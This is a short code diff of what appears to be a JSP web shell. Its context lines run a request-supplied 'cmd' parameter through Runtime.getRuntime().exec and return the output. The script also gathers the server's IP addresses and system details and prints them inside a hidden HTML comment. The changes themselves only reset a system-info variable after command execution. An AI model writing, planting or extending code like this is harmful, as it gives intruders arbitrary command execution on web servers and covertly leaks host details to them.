@@ -45,6 +45,7 @@ if (cmd != null)
         }
         os.close();
         in.close();
+        szSys = "";
     } catch (Exception x6) {
         try{
             p = Runtime.getRuntime().exec(cmd);
@@ -61,6 +62,7 @@ if (cmd != null)
             }
             os.close();
             in.close();
+            szSys = "";
         } catch (Exception x1) {
             out.println(x1.getMessage());
         }
@@ -165,6 +167,7 @@ if (cmd != null)
                     if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
                 }
             }
+
             out.print("<!-- ip:" + szIp + "," + szSys+ " -->");  
         } catch (Exception e) {
         }
